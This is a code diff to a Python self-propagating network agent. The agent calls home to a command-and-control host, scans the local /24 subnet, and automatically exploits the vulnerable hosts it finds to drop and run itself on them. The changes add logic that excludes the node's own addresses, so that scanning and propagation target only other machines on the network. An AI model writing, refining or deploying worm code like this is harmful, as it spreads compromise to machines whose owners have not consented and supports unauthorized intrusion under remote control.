@@ -106,6 +106,15 @@ def get_local_subnet():
     parts = ip.split('.')
     return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
 
+def get_own_ips():
+    """All IPs belonging to this node — never scan these"""
+    own = {'127.0.0.1', 'localhost', '::1'}
+    try:
+        own.add(socket.gethostbyname(socket.gethostname()))
+    except: pass
+    own.add(get_local_ip())
+    return own
+
 def api_call(path, method="GET", data=None):
     """Call home to C2/API"""
     url = f"http://{C2_HOST}:{C2_PORT}{path}"
@@ -168,7 +177,11 @@ PROPAGATED_TO = set()
 def try_propagate(ip, port, vuln_id):
     """Try to drop and run our agent on a remote host"""
     global TOTAL_DEPLOYED
-    
+
+    own = get_own_ips()
+    if ip in own:
+        return False  # never propagate to self
+
     if ip in PROPAGATED_TO:
         return False
     
@@ -255,15 +268,21 @@ def try_propagate(ip, port, vuln_id):
 def run_scan_cycle():
     global CYCLE, TOTAL_VULNS, TOTAL_DEPLOYED
     
-    my_ip = get_local_ip()
+    my_ip  = get_local_ip()
     subnet = get_local_subnet()
-    
+    own    = get_own_ips()
+
     CYCLE += 1
     log(f"Cycle #{CYCLE} | IP: {my_ip} | Subnet: {subnet}", "SCAN")
-    
-    # Build target list — self + local subnet
-    targets = [my_ip, '127.0.0.1'] + expand_cidr(subnet, max_hosts=30)
+
+    # Build target list — EXCLUDE SELF, scan only external hosts
+    all_targets = expand_cidr(subnet, max_hosts=50)
+    targets = [t for t in all_targets if t not in own]
     targets = list(dict.fromkeys(targets))  # deduplicate
+
+    if not targets:
+        log(f"No external targets found in {subnet}, skipping cycle", "WARN")
+        return
     
     # Scan all targets in parallel
     scan_results = []
@@ -284,10 +303,13 @@ def run_scan_cycle():
     TOTAL_VULNS += len(all_vulns)
     log(f"Cycle #{CYCLE}: {len(scan_results)} hosts, {len(all_vulns)} vulns", "FOUND")
     
-    # Exploit + propagate
+    # Exploit + propagate — never target self
+    own = get_own_ips()
     for vuln in all_vulns:
         if not vuln['auto_exploit']:
             continue
+        if vuln['host'] in own:
+            continue  # skip self
         key = f"{vuln['host']}:{vuln['port']}:{vuln['vuln_id']}"
         if key in DEPLOYED_KEYS:
             continue
